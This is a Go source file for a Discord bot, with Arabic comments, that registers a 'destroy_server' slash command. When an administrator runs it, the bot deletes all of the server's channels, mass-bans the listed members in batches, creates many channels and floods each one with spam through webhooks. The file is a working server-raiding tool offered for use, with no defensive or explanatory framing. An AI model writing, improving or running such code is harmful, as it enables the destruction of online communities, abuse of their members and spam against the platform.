package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

var client = &http.Client{
	Timeout: 10 * time.Second,
}

func main() {
	token := os.Getenv("MASTERGUARD_TOKEN")
	if token == "" {
		fmt.Println("❌ خطأ: لم يتم العثور على التوكن في متغير البيئة MASTERGUARD_TOKEN")
		return
	}

	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("خطأ في إنشاء جلسة البوت:", err)
		return
	}

	sess.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMembers

	cmdName := "destroy_server"
	command := &discordgo.ApplicationCommand{
		Name:        cmdName,
		Description: "أمر تدمير السيرفر الخارق (ويب هوكات مضمونة وسريعة جداً)",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "room_name",
				Description: "اسم الرومات الجديدة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "rooms_count",
				Description: "عدد الرومات المراد إنشاؤها",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "webhook_name",
				Description: "اسم الويب هوك",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى رسالة السبام",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل في كل روم",
				Required:    true,
			},
		},
	}

	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
		if i.ApplicationCommandData().Name == cmdName {
			if (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
					Type: discordgo.InteractionResponseChannelMessageWithSource,
					Data: &discordgo.InteractionResponseData{
						Content: "❌ يجب أن تكون مشرفاً لاستخدام هذا الأمر.",
						Flags:   discordgo.MessageFlagsEphemeral,
					},
				})
				return
			}

			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "🚀 جاري تنفيذ التدمير بالويب هوكات بأقصى سرعة وضمان كامل...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			options := i.ApplicationCommandData().Options
			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range options {
				optionMap[opt.Name] = opt
			}

			roomName := optionMap["room_name"].StringValue()
			roomsCount := int(optionMap["rooms_count"].IntValue())
			webhookName := optionMap["webhook_name"].StringValue()
			messageContent := optionMap["message_content"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())

			guildID := i.GuildID

			go executeDestruction(token, guildID, roomName, roomsCount, webhookName, messageContent, messagesCount)
		}
	})

	err = sess.Open()
	if err != nil {
		fmt.Println("خطأ في فتح الاتصال:", err)
		return
	}

	_, err = sess.ApplicationCommandCreate(sess.State.User.ID, "", command)
	if err != nil {
		fmt.Println("خطأ في تسجيل أمر السلاش:", err)
	}

	fmt.Println("🤖 البوت شغال الآن وجاهز لأوامر السلاش!")

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	sess.Close()
}

func executeDestruction(token, guildID, roomName string, roomsCount int, webhookName, messageContent string, messagesCount int) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
	}

	// 1. حذف الرومات القديمة بالتوازي السريع جداً
	go func() {
		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		defer resp.Body.Close()

		var channels []map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&channels)

		for _, ch := range channels {
			if id, ok := ch["id"].(string); ok {
				go func(chID string) {
					delReq, _ := http.NewRequest("DELETE", "https://discord.com/api/v10/channels/"+chID, nil)
					for k, v := range headers {
						delReq.Header.Set(k, v)
					}
					if r, e := client.Do(delReq); e == nil {
						r.Body.Close()
					}
				}(id)
			}
		}
	}()

	// 2. نظام الباند السريع على دفعات
	go func() {
		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/members?limit=1000", nil)
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		defer resp.Body.Close()

		var members []map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&members)

		var userIDs []string
		for _, m := range members {
			if user, ok := m["user"].(map[string]interface{}); ok {
				if userID, ok := user["id"].(string); ok {
					userIDs = append(userIDs, userID)
				}
			}
		}

		batchSize := 50
		for i := 0; i < len(userIDs); i += batchSize {
			end := i + batchSize
			if end > len(userIDs) {
				end = len(userIDs)
			}

			for _, uID := range userIDs[i:end] {
				go func(id string) {
					banReq, _ := http.NewRequest("PUT", "https://discord.com/api/v10/guilds/"+guildID+"/bans/"+id, nil)
					for k, v := range headers {
						banReq.Header.Set(k, v)
					}
					if r, e := client.Do(banReq); e == nil {
						r.Body.Close()
					}
				}(uID)
			}
			time.Sleep(100 * time.Millisecond)
		}
	}()

	// 3. إنشاء الرومات بشكل متزامن سريع باستخدام WaitGroup لضمان جمع كل الأيدي (IDs) بدون أي فقدان
	var wg sync.WaitGroup
	var mu sync.Mutex
	var channelIDs []string

	concurrencyLimit := make(chan struct{}, 10) // تفتيح 10 مسارات في نفس اللحظة لمنع تعليق ديسكورد

	for i := 0; i < roomsCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			concurrencyLimit <- struct{}{}
			defer func() { <-concurrencyLimit }()

			payload, _ := json.Marshal(map[string]interface{}{
				"name": roomName,
				"type": 0,
			})
			req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
			for k, v := range headers {
				req.Header.Set(k, v)
			}

			resp, err := client.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
				var chResult map[string]interface{}
				json.NewDecoder(resp.Body).Decode(&chResult)
				if chID, ok := chResult["id"].(string); ok {
					mu.Lock()
					channelIDs = append(channelIDs, chID)
					mu.Unlock()
				}
			}
		}()
	}
	wg.Wait() // الانتظار حتى تنتهي جميع الرومات من الإنشاء تماماً وبسرعة خيالية

	// 4. إنشاء الويب هوكات لكل الرومات بشكل متوازي وذكي، ثم السبام الفوري
	for _, chID := range channelIDs {
		go func(cID string) {
			// محاولة إنشاء الويب هوك مع إعادة المحاولة التلقائية لو حصل ضغط
			var whURL string
			for attempt := 0; attempt < 3; attempt++ {
				whPayload, _ := json.Marshal(map[string]string{"name": webhookName})
				whReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+cID+"/webhooks", bytes.NewBuffer(whPayload))
				for k, v := range headers {
					whReq.Header.Set(k, v)
				}

				whResp, err := client.Do(whReq)
				if err == nil {
					var whResult map[string]interface{}
					json.NewDecoder(whResp.Body).Decode(&whResult)
					whResp.Body.Close()

					tok, tokOk := whResult["token"].(string)
					id, idOk := whResult["id"].(string)
					if tokOk && idOk {
						whURL = fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tok)
						break
					}
				}
				time.Sleep(100 * time.Millisecond)
			}

			if whURL == "" {
				return // لو فشل الويب هوك بعد 3 محاولات يتخطاه
			}

			// إرسال الرسائل عبر الويب هوك الخاص بكل روم بسرعة وعن طريق الحزم
			for m := 0; m < messagesCount; m++ {
				msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
				msgReq, _ := http.NewRequest("POST", whURL, bytes.NewBuffer(msgPayload))
				msgReq.Header.Set("Content-Type", "application/json")

				msgResp, err := client.Do(msgReq)
				if err == nil {
					msgResp.Body.Close()
				}
				time.Sleep(30 * time.Millisecond) // سرعة عالية جداً ومضمونة
			}
		}(chID)
	}
}
